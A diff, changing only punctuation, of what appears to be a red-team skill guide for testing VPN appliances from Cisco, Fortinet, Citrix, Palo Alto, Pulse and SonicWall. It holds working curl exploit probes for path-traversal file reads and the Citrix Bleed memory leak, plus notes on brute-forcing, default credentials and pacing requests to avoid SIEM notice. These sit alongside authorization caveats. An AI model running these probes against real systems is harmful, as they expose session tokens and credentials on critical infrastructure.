@@ -119,7 +119,7 @@ curl -skI 'https://target/my.policy' | head -10
 
 ---
 
-## Historical CVE leads: not verified applicability
+## Historical CVE leads — not verified applicability
 
 Ranges and example probes below are imported leads, not an authoritative affected
 version list or validated tests. Before selecting a test, read the exact vendor
@@ -128,26 +128,26 @@ response size or scanner label alone is not a finding. Traversal/session-memory
 examples can expose real credentials; prefer owner-supplied build evidence and
 synthetic lab fixtures and do not collect unrelated users' sessions.
 
-## CVE matrix: pre-auth or auth-bypass (2018-2026)
+## CVE matrix — pre-auth or auth-bypass (2018-2026)
 
 ### Cisco ASA / AnyConnect
 
 | CVE | Affects | Type | Test |
 |---|---|---|---|
-| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal; info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
-| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal; file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
+| **CVE-2018-0296** | ASA pre-9.x specific builds | Path traversal — info disclosure (sessions, config) | `GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua` |
+| **CVE-2020-3452** | ASA, FTD before specific patch levels | Path traversal — file read | `GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua` and variations |
 | **CVE-2023-20269** | ASA, FTD specific | Auth bypass on SSL VPN | Brute-force a group + valid creds combo against `/+webvpn+/index.html` |
-| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team; disruptive** |
+| **CVE-2024-20481** | RAVPN | DoS via crafted handshake | **SKIP in red team — disruptive** |
 
 ```bash
-# Cisco CVE-2020-3452: file read
+# Cisco CVE-2020-3452 — file read
 curl -sk 'https://target/+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua' | head -5
 
-# Cisco CVE-2018-0296: path traversal
+# Cisco CVE-2018-0296 — path traversal
 curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua' | head -20
 
 # Files commonly retrievable on vulnerable ASA:
-# /+CSCOE+/portal_inc.lua    (portal inclusions: may reveal local users)
+# /+CSCOE+/portal_inc.lua    (portal inclusions — may reveal local users)
 # /+CSCOE+/session_password.html
 # /+CSCOE+/files/files.html
 ```
@@ -156,14 +156,14 @@ curl -sk 'https://target/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE
 
 | CVE | Affects | Type | Test |
 |---|---|---|---|
-| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal; sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
-| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow; pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
-| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow; pre-auth RCE | Public PoCs exist; nuclei template available |
-| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write; pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
+| **CVE-2018-13379** | FortiOS 5.4-6.0 | Path traversal — sslvpn_websession file read | `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` |
+| **CVE-2022-42475** | FortiOS 7.x specific | Heap overflow — pre-auth RCE | Complex exploit; test with `nuclei` template `CVE-2022-42475` |
+| **CVE-2023-27997** (XORtigate) | FortiOS various | Heap overflow — pre-auth RCE | Public PoCs exist; nuclei template available |
+| **CVE-2024-21762** | FortiOS 6.x-7.x | OOB write — pre-auth RCE | Public PoC; nuclei template `CVE-2024-21762` |
 | **CVE-2024-55591** | FortiOS 7.0-7.4 | Auth bypass on FortiOS Node.js websocket admin interface | `GET /endpoint` on admin-interface port |
 
 ```bash
-# Fortinet CVE-2018-13379: most reliably-fingerprintable file read
+# Fortinet CVE-2018-13379 — most reliably-fingerprintable file read
 curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
 # Response contains plaintext usernames + sessions if vulnerable
 
@@ -178,13 +178,13 @@ curl -sk --path-as-is 'https://target/remote/fgt_lang?lang=/../../../../////////
 | **CVE-2019-19781** (Shitrix) | ADC/Gateway 10.5-13.0 specific | Path traversal → RCE via XML upload | `GET /vpn/../vpns/cfg/smb.conf` |
 | **CVE-2022-27518** | ADC/Gateway with SAML configured | Pre-auth RCE | Complex; test with nuclei |
 | **CVE-2023-3519** | NetScaler ADC/Gateway 13.0-13.1 specific | Pre-auth RCE via crafted HTTP | Public PoCs exist |
-| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header; long Host header triggers memory leak in response |
+| **CVE-2023-4966** (Citrix Bleed) | NetScaler ADC/Gateway 13.0-14.1 | Memory disclosure → session token theft | `POST /oauth/idp/.well-known/openid-configuration` with crafted Host header — long Host header triggers memory leak in response |
 
 ```bash
 # Citrix Bleed (CVE-2023-4966) detection
 HOST=$(python3 -c "print('A' * 24812)")
 curl -sk -X POST -H "Host: $HOST" "https://target/oauth/idp/.well-known/openid-configuration" -o response.txt
-# If response is large (>10KB) and contains random memory contents: vulnerable
+# If response is large (>10KB) and contains random memory contents — vulnerable
 # Session tokens often present in the memory dump
 
 # CVE-2019-19781 file read
@@ -195,7 +195,7 @@ curl -sk --path-as-is 'https://target/vpn/../vpns/cfg/smb.conf'
 
 | CVE | Affects | Type | Test |
 |---|---|---|---|
-| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection; pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |
+| **CVE-2024-3400** | PAN-OS 10.2-11.1 with GP enabled | Command injection — pre-auth RCE | `POST /ssl-vpn/login.esp` with crafted Cookie header containing `SESSID=../../../var/log/pan/test.txt` |
 
 The former Cookie probe mixed path creation and `$(id)` and claimed command-output
 proof from a response. It is not a reliable detection recipe. Compare exact build
@@ -212,7 +212,7 @@ requires a separately approved lab procedure and owner-side verification.
 | **CVE-2023-46805** | Ivanti Connect Secure 9.1-22.6 | Auth bypass | Combined with 21887 for full chain |
 
 ```bash
-# CVE-2019-11510: Pulse file read
+# CVE-2019-11510 — Pulse file read
 curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/'
 ```
 
@@ -220,7 +220,7 @@ curl -sk --path-as-is 'https://target/dana-na/../dana/html5acc/guacamole/../../.
 
 | CVE | Affects | Type | Test |
 |---|---|---|---|
-| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection; pre-auth | nuclei template available |
+| **CVE-2021-20016** | SMA 100 series specific firmware | SQL injection — pre-auth | nuclei template available |
 | **CVE-2024-40766** | SonicOS specific | Access-control flaw | Specific firmware versions |
 
 ---
@@ -248,7 +248,7 @@ Look for:
 
 ---
 
-## Default credentials (test sparingly: lockout risk)
+## Default credentials (test sparingly — lockout risk)
 
 | Vendor | User | Password | Notes |
 |---|---|---|---|
@@ -322,30 +322,30 @@ an appliance-safe default. A 404 or large response does not establish patch stat
 
 ## Operational discipline
 
-- **Banner-stripped servers (no version disclosure)** are good defense-in-depth; record as positive finding even if no CVE found
-- **Rate-limit yourself**; these appliances often log every request to a SIEM. Patient pace, jittered timing.
-- **SAML metadata may be public**; access it only within authorized scope; redact internal identifiers in reports.
-- **Don't run pre-auth-RCE PoCs in red team without explicit OK**; accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
-- **Document the AAA backend identification**; knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.
+- **Banner-stripped servers (no version disclosure)** are good defense-in-depth — record as positive finding even if no CVE found
+- **Rate-limit yourself** — these appliances often log every request to a SIEM. Patient pace, jittered timing.
+- **SAML metadata may be public** — access it only within authorized scope; redact internal identifiers in reports.
+- **Don't run pre-auth-RCE PoCs in red team without explicit OK** — accidentally bricking a VPN concentrator = catastrophic for the client. Detection-only tests first, then escalate with permission.
+- **Document the AAA backend identification** — knowing whether ASA uses RADIUS-to-local vs SAML-to-Entra changes downstream attack paths.
 
 ---
 
 ## Bridge to neighboring skills
 
-- `m365-entra-attack`; when AAA backend is Entra SAML; cred-spray strategy carries over
-- `hunt-saml`; XSW / signature-stripping if SAML SP is misconfigured
-- `mid-engagement-ir-detection`; appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
-- `redteam-mindset`; banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints
+- `m365-entra-attack` — when AAA backend is Entra SAML; cred-spray strategy carries over
+- `hunt-saml` — XSW / signature-stripping if SAML SP is misconfigured
+- `mid-engagement-ir-detection` — appliances generate noisy logs; watch for IPS rules being deployed mid-engagement
+- `redteam-mindset` — banner-stripped ≠ "not vulnerable"; keep digging via behavioral fingerprints
 
 ---
 
 ## Anti-patterns
 
-- **Don't conclude "patched" from a 404 on one CVE path**; patches deploy unevenly; compare exact build/configuration and vendor evidence; do not mandate extra exploit attempts
-- **Don't trust the version banner alone**; appliance vendors often backport fixes without bumping the version string
-- **Don't run heavy nuclei scans without rate-limiting**; these appliances are critical infrastructure
-- **Don't fingerprint by trying all CVE PoCs immediately**; start with non-disruptive HEAD + version-banner probes
-- **Don't skip SAML metadata**; even when the appliance is patched, SAML SP misconfig is its own attack surface
+- **Don't conclude "patched" from a 404 on one CVE path** — patches deploy unevenly; compare exact build/configuration and vendor evidence; do not mandate extra exploit attempts
+- **Don't trust the version banner alone** — appliance vendors often backport fixes without bumping the version string
+- **Don't run heavy nuclei scans without rate-limiting** — these appliances are critical infrastructure
+- **Don't fingerprint by trying all CVE PoCs immediately** — start with non-disruptive HEAD + version-banner probes
+- **Don't skip SAML metadata** — even when the appliance is patched, SAML SP misconfig is its own attack surface
 
 ---
 
